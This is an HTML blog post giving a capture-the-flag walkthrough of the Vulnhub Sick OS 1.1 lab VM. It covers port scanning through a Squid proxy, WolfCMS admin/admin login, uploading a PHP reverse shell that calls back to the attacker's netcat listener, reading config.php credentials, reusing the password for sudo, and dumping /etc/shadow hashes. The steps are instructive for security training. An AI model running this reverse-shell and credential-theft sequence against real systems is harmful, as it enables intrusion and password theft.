@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Vulnhub Sick OS 1.1</title>
+<meta name="description" content="A small website blog for cyber sec and pentesting adventures. ">
+
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" type="text/css" media="all" href="/css/style.css" />
+<link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
+<link rel="stylesheet" href="/css/highlightjs.piperita.css">
+
+<!-- Favicons generated at http://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="/favicons/apple-touch-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="/favicons/apple-touch-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="/favicons/apple-touch-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="/favicons/apple-touch-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="/favicons/apple-touch-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon-180x180.png">
+<link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/favicons/android-chrome-192x192.png" sizes="192x192">
+<link rel="icon" type="image/png" href="/favicons/favicon-96x96.png" sizes="96x96">
+<link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
+<link rel="manifest" href="/favicons/manifest.json">
+<link rel="shortcut icon" href="/favicons/favicon.ico">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="msapplication-TileImage" content="/favicons/mstile-144x144.png">
+<meta name="msapplication-config" content="/favicons/browserconfig.xml">
+<meta name="theme-color" content="#ffffff">
+
+
+
+
+
+</head>
+
+
+    <body>
+
+    <nav id="my-menu">
+  <div>
+    <p>AlternativeSec</p>
+
+    <ul class="pages">
+      <li><a href="/"><i class="fa fa-home"></i> Home</a></li>
+      <li><a href="/posts/"><i class="fa fa-archive"></i> All Posts</a></li>
+      <li><a href="/search/"><i class="fa fa-search"></i> Search</a></li>
+    </ul>
+
+    <p class="links">
+  <a href="https://www.twitter.com/SecEventsPen" target="_new"><i class="fa fa-twitter"></i></a>
+  
+  
+  
+  
+  <a href="https://github.com/Seceventspen" target="_new"><i class="fa fa-github-alt"></i></a>
+  
+  
+  
+  <a href="mailto:seceventspen@alternativesec.xyz" target="_new"><i class="fa fa-envelope"></i></a>
+  <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
+</p>
+
+  </div>
+</nav>
+<div class="menu-button" href="#menu"><i class="fa fa-bars"></i></div>
+
+
+    <div class="page-content">
+      <div class="wrap">
+      
+
+<div class="container-fluid single">
+  <div class="row">
+
+    <div itemscope itemtype="http://schema.org/Article" class="col-md-12 article">
+      
+      <div class="thumb">
+        <i class="fa fa-flag fa-4x"></i>
+      </div>
+      
+
+      <h1 class="header" itemprop="name">Vulnhub Sick OS 1.1</h1>
+
+      <div class="author">
+        <small><i>
+          
+          by
+          <span itemprop="author">
+            
+            <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+              <span itemprop="name">SecEventsPen</span>
+            </span>
+            
+          </span>
+          
+          on <span itemprop="datePublished" content="2014-08-28">February 16, 2017</span>
+           under Vulnhub
+        </i></small>
+      </div>
+
+      <div class="read-time">
+        <small>
+          9 minute read
+        </small>
+      </div>
+
+      <div class="content-panel content">
+
+        
+
+        <span itemprop="articleBody"><p>If you want to follow along you can grab the Sick OS 1.1 VM from here <a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOS</a></p>
+
+<pre><code class="language-nohighlight">Vulnhub - Sick OS 1.1 VM
+
+Name........: SickOs1.1
+Date Release: 11 Dec 2015
+Author......: D4rk
+Series......: SickOs
+Objective...: Get /root/a0216ea4d51874464078c618298b1367.txt
+Tester(s)...: h1tch1
+Twitter.....: https:twitter.com/D4rk36/
+
+Type: Boot-to-Root VM
+</code></pre>
+
+<p><strong>Host discovery</strong></p>
+
+<p>Ok first things first, we need to identify the host in my lab (the lab is sandboxed and IP ranges changed regularly). I used netdiscover for that:</p>
+
+<pre><code class="language-nohighlight"># netdiscover -r 192.168.1.0/24
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                
+
+ 20 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 1200                                                                                                                                                            
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 192.168.1.94    08:00:27:ac:f3:c3      1      60  Cadmus Computer Systems                                                                                                                                                                                                                                 
+
+</code></pre>
+
+<p>Ok good so now we have our target IP: 192.168.1.94</p>
+
+<p>Port scan and service enumeration</p>
+
+<pre><code class="language-nohighlight">:~# nmap -Pn -p- -sSV -A 192.168.1.94
+
+Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-24 11:19 EST
+Nmap scan report for SickOs.home (192.168.1.94)
+Host is up (0.00084s latency).
+Not shown: 65532 filtered ports
+PORT     STATE  SERVICE    VERSION
+22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
+|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
+|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
+3128/tcp open   http-proxy Squid http proxy 3.1.19
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:GET
+|_http-server-header: squid/3.1.19
+|_http-title: ERROR: The requested URL could not be retrieved
+8080/tcp closed http-proxy
+MAC Address: 08:00:27:AC:F3:C3 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.4
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.84 ms SickOs.home (192.168.1.94)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 120.07 seconds
+</code></pre>
+
+<p>So, our Nmap scan has identified that TCP Port 22 SSH and Port 3128 Squid proxy are open. Now we have starting point!</p>
+
+<p><strong>Squid proxy</strong></p>
+
+<p>Starting with the Squid proxy http service, I accessed it via a web browser and got this:</p>
+
+<p><img src="/images/SickOS/Browser-error.png" alt="Browser" /></p>
+
+<p>I also grabbed the HTTP Headers (just in case!):</p>
+
+<p>HTTP Header info:</p>
+
+<pre><code class="language-nohiglight">:~# curl -LIN 192.168.1.94:3128
+HTTP/1.0 400 Bad Request
+Server: squid/3.1.19
+Mime-Version: 1.0
+Date: Thu, 24 Nov 2016 17:04:44 GMT
+Content-Type: text/html
+Content-Length: 3150
+X-Squid-Error: ERR_INVALID_URL 0
+Vary: Accept-Language
+Content-Language: en
+X-Cache: MISS from localhost
+X-Cache-Lookup: NONE from localhost:3128
+Via: 1.0 localhost (squid/3.1.19)
+Connection: close
+</code></pre>
+
+<p>This didn’t give us much, as expected! Now lets set up our browser to use the Squid proxy:</p>
+
+<p><img src="/images/SickOS/ConnectionSetting.png" alt="Proxy Setup" /></p>
+
+<p>Now we have the proxy in place, it’s probably a good time to run Nikto and or Dirb (I ran both):</p>
+
+<p><strong>Nikto</strong></p>
+
+<p>Now, I’d not used nikto to scan using a proxy before, so this was new to me! A quick google/man page read sorted out the finer details.</p>
+
+<p>I needed to make a change to the ‘/etc/nikto.conf’ file and add these lines:</p>
+
+<pre><code class="language-nohighlight"># Proxy settings -- still must be enabled by -userproxy
+PROXYHOST=192.168.1.94
+PROXYPORT=3128
+</code></pre>
+
+<p>Once the changes had been made and saved, it was time to set Nikto loose!</p>
+
+<p><img src="/images/SickOS/Nikto.png" alt="Nikto" /></p>
+
+<p><strong>Dirb</strong></p>
+
+<p>Using Dirb via the proxy was a similar process, though no config change was needed,  I just had to specify the target URL, add the ‘-p’ flag, then our target IP:Port.</p>
+
+<p><img src="/images/SickOS/Dirb.png" alt="Dirb" /></p>
+
+<p>Ok, so know we have a decent idea of what’s going on with the web-server. Now that the proxy is enabled, I opened up a browser again and entered the target IP:</p>
+
+<p><img src="/images/SickOS/Blehhh.png" alt="Dirb" /></p>
+
+<p>Now we have a different response, winner! Now we’re gaining some traction!!!
+So lets check the ‘/robots.txt’ file highlighted by Dirb.</p>
+
+<p>So the /robots.txt file reveals:</p>
+
+<pre><code class="language-nohighlight">User-agent: *
+Disallow: /
+Dissalow: /wolfcms
+</code></pre>
+
+<p>Another clue … ‘/wolfcms’, the game is a foot, lets get investigating!!!</p>
+
+<p>By browsing to ‘192.168.1.94/wolfcms/’ we are greeted with a WolfCMS page (a quick google confirmed this was a content management system):</p>
+
+<p><img src="/images/SickOS/Wolfcms.png" alt="WolfCMS" /></p>
+
+<p>So, there wasn’t an obvious login option on the WolfCMS page, time for our old faithful friend, Google! A quick google lead me to this:</p>
+
+<pre><code class="language-nohighlight">&lt;Target_URL&gt;/wolfcms/?/admin/login
+</code></pre>
+
+<p><img src="/images/SickOS/Wolfcms-login.png" alt="Wolf Login" /></p>
+
+<p>As soon as I clicked on the ‘Username’ field an auto complete box popped up with the following:</p>
+
+<p><img src="/images/SickOS/Wolfcms-login-password.png" alt="Wolf password" /></p>
+
+<p>Taking this as a sign from the ‘L33T’ gods, I entered the old faithful combo of ‘admin/admin’; however, this failed with the following error:</p>
+
+<pre><code class="language-nohighlight">The page isn't redirecting properly
+
+Firefox has detected that the server is redirecting the request for this address in a way that will never complete.
+</code></pre>
+
+<p>Hmmm … what’s going on here then!</p>
+
+<p>After a little online search, it seems that this may have something to do with cookies. A quick search led me to this…</p>
+
+<pre><code class="language-nohighlight">On the redirect page press 'Alt + t' &gt; Page info &gt;  Security &gt; View Coookies &gt; Search &lt;Target_IP&gt; &gt; 'Remove All' and close.
+</code></pre>
+
+<p>Once I had done the above, I refreshed the browser. This took me back to the login screen. I Re-entered the ‘admin/admin’ combo and I was in! If you’re following along, you should be greeted with the following:</p>
+
+<p><img src="/images/SickOS/Wolfcms-Admin.png" alt="Wolf Admin" /></p>
+
+<p>So now we have access to the web server as an administrator. Looking around the settings confirms this, and it also seems I have the option to add a user and upload files!! DING DING DING!!! So I added an additional user as a back up with the same privilege level as the Administrator user:</p>
+
+<pre><code class="language-nohighlight">Name: bob
+Username: Hacker
+Password: Hacker123
+</code></pre>
+
+<p><em>NB: Cheese alert!! I was having a ‘L33t’ moment with the username/password combo … forgive me!</em></p>
+
+<p>Ok, so a quick recap; we now have web access as the administrator to the target hosts CMS application and we have added a back up user for those ‘just incase’ scenarios. Though this is not the main objective, we need to root the host!</p>
+
+<p>After this I switched my attention to the file upload facility that I have access to as the user ‘administrator’!</p>
+
+<p>The web server runs php code with at least one php file present already (as seen below):</p>
+
+<pre><code class="language-nohighlight">%B%Y archive
+&lt;?php $archives = $this-&gt;archive-&gt;get(); ?&gt;
+&lt;?php foreach ($archives as $archive): ?&gt;
+&lt;div class="entry"&gt;
+  &lt;h3&gt;&lt;?php echo $archive-&gt;link(); ?&gt;&lt;/h3&gt;
+  &lt;p class="info"&gt;Posted by &lt;?php echo $archive-&gt;author(); ?&gt; on &lt;?php echo $archive-&gt;date(); ?&gt;
+  &lt;/p&gt;
+&lt;/div&gt;
+&lt;?php endforeach; ?&gt;
+</code></pre>
+
+<p>With this in mind, now seems like a good time to thinking about upload a PHP-Reverse-Shell! Pentestmonkey springs to mind! A quick visit to his site <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">Pentestmonkey.net</a> lets us nab a copy of his:</p>
+
+<p>I modified the code to suit our scenario.</p>
+
+<pre><code class="language-nohighlight">set_time_limit (0);
+$VERSION = "1.0";
+$ip = '192.168.1.174';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+</code></pre>
+
+<p>As I now know from the Nikto/Dirb scans there are publicly accessible/browsable directories available on the host via the web browser. One of these dir’s is ‘/public/images’. This seems like a good location to upload our shell to. Through our Administrator console</p>
+
+<p>Selecting the ‘Files’ option:</p>
+
+<p><img src="/images/SickOS/Wolfcms-fileupload.png" alt="Wolf Admin" /></p>
+
+<p>Uploading the php-reverse-shell file to the ‘/public/images’ directory is successful.</p>
+
+<p><strong>Exploit time…</strong></p>
+
+<p>Starting a netcat listener on my host allows me to catch the incoming connection from our reverse shell that I uploaded:</p>
+
+<pre><code class="language-nohighlight">nc -lvp 1234
+</code></pre>
+
+<p>Then by browsing to the reverse shell URL:</p>
+
+<pre><code class="language-nohighlight">http://192.168.1.94/wolfcms/public/images/
+</code></pre>
+
+<p>We trigger our reverse php shell by double clicking on it. This will then activate on our attacking host terminal where we set up the netcat listener:</p>
+
+<pre><code class="language-nohighlight">root@Shadow:~# nc -l -v -p 1234
+listening on [any] 1234 ...
+connect to [192.168.1.174] from SickOs.home [192.168.1.94] 41618
+Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
+ 15:29:06 up 31 min,  0 users,  load average: 0.01, 0.05, 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+$ ls
+</code></pre>
+
+<p>Ok, so its a low privilege shell! We need to elevate!! Whilst here, I look around for anything that can help with that:</p>
+
+<pre><code class="language-nohighlight">Host info (/etc/os-release):
+
+$ cat os-release
+NAME="Ubuntu"
+VERSION="12.04.4 LTS, Precise Pangolin"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu precise (12.04.4 LTS)"
+VERSION_ID="12.04"
+</code></pre>
+
+<p>Then I had a look at the ‘/etc/passwd’ file for other users:</p>
+
+<pre><code class="language-nohighlight">$ cat passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+whoopsie:x:103:106::/nonexistent:/bin/false
+landscape:x:104:109::/var/lib/landscape:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
+mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre>
+
+<p><em>Note the ‘sickos’ user highlighted above.</em></p>
+
+<p>I then decided to look in the ‘/var/www’ dir, to see if any of the files there have anything useful:</p>
+
+<pre><code class="language-nohighlight">$ cd ../var/www                       
+$ ls
+connect.py
+index.php
+robots.txt
+wolfcms
+</code></pre>
+
+<p>‘wolfcms’ is directory, so I looked in there to:</p>
+
+<pre><code class="language-nohighlight">$ cd wolfcms
+$ ls
+CONTRIBUTING.md
+README.md
+composer.json
+config.php
+docs
+favicon.ico
+index.php
+public
+robots.txt
+wolf
+</code></pre>
+
+<p>While having a look through the files in this dir the ‘config.php’ seemed like an obvious place to start for any hardcoded creds. Bingo!! The file contained some interesting details:</p>
+
+<pre><code class="language-nohighlight">// Database settings:
+define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
+define('DB_USER', 'root');
+define('DB_PASS', 'john@123');
+define('TABLE_PREFIX', '');
+</code></pre>
+
+<p>With the above info and using the discovered user ‘sickos’ I can now attempt to leverage the ssh service on the target host:</p>
+
+<p><img src="/images/SickOS/ssh.png" alt="Wolf Admin" /></p>
+
+<p>With the user confirmed as ‘sickos’ I checked if I had sudo privileges, using the same password ‘john@123’. This was accepted and I now have root privilege:</p>
+
+<pre><code class="language-nohighlight">sickos@SickOs:/$ sudo su
+[sudo] password for sickos:
+root@SickOs:/# whoami
+root
+</code></pre>
+
+<p>With this now confirmed, time to get some info:</p>
+
+<pre><code class="language-nohighlight">--[Snip of shadow file]--
+root@SickOs:/# cat /etc/shadow
+root:$6$0QtWAOH/$6uGGYVCw2lccBlovXeH8dqH6ILcCRZw.OydoldEZVS3m7RxgdUoZLl3UbDId59KMTUuxkGG/ln0gbwWSO7kNp.:16775:0:99999:7:::
+sickos:$6$x3xnQBfR$4WohiqaIzmpfk1duLLeJqA33zNhEQeuvPS4NiLLIxxOyNwz2dRMUbah.MZ0gSVMV4YNJC6meNpxa4YSrSJ75X.:16700:0:99999:7:::
+</code></pre>
+
+<p>User hashes dumped.</p>
+
+<p>And saving the best for last ………</p>
+
+<p><img src="/images/SickOS/Proof.png" alt="Wolf Admin" /></p>
+
+<p>There we have it folks! We got through it all and completed the objective, root access and ultimately pwnd SickOS! This is just the way I ‘rooted’ SickOS, there are other ways of doing this and more info can be retrieved…</p>
+
+<p>I’d like to say a big thank you to <a href="https://twitter.com/VulnHub">@Vulnhub</a> and <a href="https:twitter.com/D4rk36/">@D4rk36</a> for providing the Sick OS series.</p>
+
+<p>Well thats it folks… You don’t have to go home, but you cant stay here!</p>
+
+<p>Thanks for reading!!</p>
+</span>
+
+        
+
+        
+
+        
+        <div class="tags">
+          <small>
+          <i class="fa fa-tags"></i>
+            2017, Vulnhub, walkthroughs, Sick OS, New
+          </small>
+        </div>
+        
+
+      </div>
+
+      
+      <div class="content-panel feedback">
+        I <i class="fa fa-heart"></i> feedback.<br />
+        Let me know what you think of this article on twitter <a href="http://www.twitter.com/SecEventsPen">@SecEventsPen</a>!
+      </div>
+      
+
+      
+
+      
+
+    </div>
+
+  </div>
+
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="footer clearfix">
+  <div class="col-md-6">
+    Made with <i class="fa fa-heart"></i> by <a href="https://twitter.com/SecEventsPen">SecEventsPen</a>
+  </div>
+  <div class="col-md-6">
+    &lt;/&gt; on <a href="https://github.com/Seceventspen">Github</a> &nbsp;<i class="fa fa-github-alt"></i>
+  </div>
+</div>
+
+<script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
+<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
+<script src="/js/jquery.mmenu.min.all.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+<script type="text/javascript">
+   $(document).ready(function() {
+      $("#my-menu").mmenu().on( "closed.mm", function() {
+            $(".menu-button").show();
+         });
+      $(".menu-button").click(function() {
+        $(".menu-button").hide();
+        $("#my-menu").trigger("open.mm");
+      });
+   });
+</script>
+
+
+
+
+
+
+    </body>
+</html>
